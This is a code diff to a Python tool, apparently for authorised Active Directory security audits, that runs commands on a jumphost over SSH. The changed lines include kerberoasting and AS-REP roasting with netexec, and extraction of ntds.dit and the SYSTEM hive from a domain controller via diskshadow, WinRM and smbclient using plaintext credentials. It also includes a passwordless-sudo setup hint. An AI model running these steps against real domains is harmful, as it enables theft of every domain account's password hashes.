@@ -41,7 +41,7 @@ def run_ssh_command(hostname, command):
 
     return output, error
 
-def run_scp_command(hostname, path1, path2, metode):
+def run_scp_command(hostname, local_path, remote_path, metode):
     # Check if we have an existing connection
     if hostname not in _ssh_connections:
         run_ssh_command(hostname, "echo")  # This will create the connection
@@ -53,10 +53,10 @@ def run_scp_command(hostname, path1, path2, metode):
     
     try:
         if metode == 'get':
-            _sftp_connections[hostname].get(path1, path2)
+            _sftp_connections[hostname].get(remote_path, local_path)
 
         if metode == 'put':
-            _sftp_connections[hostname].put(path1, path2)
+            _sftp_connections[hostname].put(local_path, remote_path)
     except Exception as e:
         return f'SCP failed: {str(e)}'
     
@@ -175,10 +175,10 @@ def validate_access(config):
             'cmd': 'command -v tmux',
             'fix': 'sudo apt install -y tmux'
         },
-        'parallel': {
-            'cmd': 'command -v parallel',
-            'fix': 'sudo apt install -y parallel'
-        },
+        # 'parallel': {
+        #     'cmd': 'command -v parallel',
+        #     'fix': 'sudo apt install -y parallel'
+        # },
         'sudo_nopasswd': {
             'cmd': 'sudo -n true',
             'fix': 'Run "sudo visudo" and add: "$USER ALL=(ALL) NOPASSWD: ALL"'
@@ -257,7 +257,7 @@ def start_nmaps(scan_file, host):
         f.write(scan_file)
 
     # transfer commands file on the remote
-    cp = copy_files(f'{host_name}-segtest/full_nmap.xargs', f'{host_name}:~/segtest/full_nmap.xargs')
+    cp = run_scp_command(host_name, f'{host_name}-segtest/full_nmap.xargs', f'segtest/full_nmap.xargs', 'put')
 
     try:
         xargs = f'xargs -P {host['parallel']}'
@@ -339,6 +339,10 @@ def roasting(jh, dc_ip, user, password, domain):
     asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast roasting/asreproasted-users"
 
     kerb = run_ssh_command(jh, kerb_cmd)
+
+    if len(kerb[1]) != 0:
+        print('Some error happened. : \n\n', kerb[1])
+        exit()
     print('Performing kerberoasting!')
     asrep = run_ssh_command(jh, asrep_cmd)
     print('Performing ASREPRoasting!')
@@ -537,7 +541,7 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
         command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"
 
         # create remote directory
-        create_rem_dir = 'mkdir ntds-dump'
+        create_rem_dir = 'mkdir ntds'
         create = run_ssh_command(jh, create_rem_dir)
         
         print(color_text('Running diskshadow.\n', Color.BOLD))
@@ -546,8 +550,8 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
             print(command2)
             print(run_audit[0])
 
-        command322 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/copy-system.hive ntds-dump/copy-system.hive'"
-        command333 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/ntds.dit ntds-dump/ntds.dit'"
+        command322 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/copy-system.hive ntds/copy-system.hive'"
+        command333 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/ntds.dit ntds/ntds.dit'"
 
         print(color_text('Diskshadow done, grabbing files over on the jumphost...\n', Color.GREEN))
         jh_grab_audit2 = run_ssh_command(jh, command322)
@@ -562,8 +566,8 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
 
         print(color_text('Grabbing files over from jumphost...\n', Color.BOLD))
         
-        grab_audit1 = run_scp_command(jh,'ntds-dump/ntds.dit', 'ntds/ntds.dit', 'get')
-        grab_audit2 = run_scp_command(jh, 'ntds-dump/copy-system.hive', 'ntds/copy-system.hive', 'get')
+        grab_audit1 = run_scp_command(jh,'ntds/ntds.dit', 'ntds/ntds.dit', 'get')
+        grab_audit2 = run_scp_command(jh,'ntds/copy-system.hive', 'ntds/copy-system.hive', 'get')
 
         print(color_text('Grabbing enabled users and high priv users. If fails only run users module.\n', Color.BOLD))
         users = en_users(jh, dc_ip, user, password, domain)
